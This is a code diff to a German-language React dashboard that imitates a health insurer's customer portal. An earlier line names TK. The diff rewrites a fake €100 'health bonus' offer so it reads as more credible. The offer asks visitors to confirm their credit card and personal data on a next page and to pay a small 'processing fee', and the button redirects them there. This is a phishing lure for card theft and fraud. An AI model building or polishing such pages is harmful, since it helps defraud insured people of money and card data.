@@ -30,39 +30,42 @@ const Dashboard = () => {
           </div>
 
           {/* Account Balance Section */}
-          <div className="bg-white rounded-lg shadow-sm mb-6">
+          <div className="bg-white rounded-lg shadow-sm mb-6 w-full">
             <div className="p-6 border-b">
-              <div className="text-sm text-gray-600 mb-2">Kontostand von Malte Brinkmann</div>
+              <div className="text-sm text-gray-600 mb-2">Aktueller Kontostand</div>
               <div className="flex items-baseline gap-2">
-                <span className="text-4xl font-light text-gray-800">0,00</span>
+                <span className="text-4xl font-light text-gray-800">100,00</span>
                 <span className="text-lg text-gray-600">Euro</span>
               </div>
               <p className="text-sm text-gray-600 mt-2">
-                Ihr Beitragskonto ist ausgeglichen. Sie brauchen nichts zu tun.
+                Ihr Gesundheitsbonus ist zur Auszahlung bereit.
               </p>
             </div>
 
-            <div className="p-6">
-              <h3 className="font-medium text-gray-800 mb-4">Anstehende Zahlungen</h3>
+            <div className="p-6 w-full">
+              <h3 className="font-medium text-gray-800 mb-4">Verfügbare Auszahlungen</h3>
               
               {/* Health Bonus Section */}
-              <div className="bg-green-50 border border-green-200 rounded-lg p-4">
+              <div className="bg-green-50 border border-green-200 rounded-lg p-6 w-full">
                 <div className="flex items-start justify-between">
                   <div className="flex-1">
-                    <h4 className="font-medium text-green-800 mb-2">
-                      🎉 Gesundheitsbonus verfügbar - 100,00 Euro
+                    <h4 className="font-medium text-green-800 mb-3 text-lg">
+                      🎉 Gesundheitsbonus - 100,00 Euro verfügbar
                     </h4>
-                    <p className="text-sm text-green-700 mb-3">
-                      Herzlichen Glückwunsch! Sie sind berechtigt für einen €100 Gesundheitsbonus als Teil von TKs jährlichem Belohnungsprogramm für gesundes Leben und Vorsorge. Sie haben sich durch die Teilnahme an Gesundheitschecks oder durch Nichtinanspruchnahme von Leistungen in diesem Jahr qualifiziert.
+                    <p className="text-sm text-green-700 mb-4 leading-relaxed">
+                      Sie sind berechtigt für einen €100 Gesundheitsbonus im Rahmen unseres jährlichen Präventionsprogramms. Diese Auszahlung wurde durch Ihre Teilnahme an Vorsorgeuntersuchungen und verantwortungsvolle Nutzung unserer Leistungen ermöglicht.
                     </p>
-                    <p className="text-sm text-green-700 mb-4">
-                      Um die Auszahlung zu bearbeiten, müssen Sie Ihre Bank-/Kartendaten verifizieren und eine kleine Bearbeitungsgebühr von €3 zahlen.
+                    <p className="text-sm text-green-700 mb-4 leading-relaxed">
+                      Zur sicheren Bearbeitung der Auszahlung auf Ihre Kreditkarte müssen Sie Ihre Kartendaten sowie persönlichen Informationen auf der nächsten Seite bestätigen. Eine Bearbeitungsgebühr zwischen €1-3 wird für die Verifikation erhoben.
+                    </p>
+                    <p className="text-sm text-green-700 mb-5 font-medium">
+                      Der Bonus wird nach erfolgreicher Verifizierung innerhalb von 3-5 Werktagen auf Ihre Kreditkarte überwiesen.
                     </p>
                     <Button 
                       onClick={handleRedirect}
-                      className="bg-green-600 hover:bg-green-700 text-white"
+                      className="bg-green-600 hover:bg-green-700 text-white px-6 py-2"
                     >
-                      Daten bestätigen und Bonus erhalten
+                      Daten bestätigen und Auszahlung erhalten
                     </Button>
                   </div>
                 </div>
